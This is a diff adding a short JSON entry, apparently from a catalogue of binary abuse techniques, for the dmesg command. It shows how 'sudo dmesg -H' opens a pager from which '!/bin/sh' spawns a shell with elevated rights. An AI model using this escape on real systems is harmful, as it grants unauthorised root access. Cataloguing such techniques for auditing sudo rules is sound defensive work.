@@ -1,0 +1,10 @@
+{
+  "description": "This invokes the default pager, which is likely to be 'less', other functions may apply.\n",
+  "functions": {
+    "sudo": [
+      {
+        "code": "sudo dmesg -H\n!/bin/sh\n"
+      }
+    ]
+  }
+}
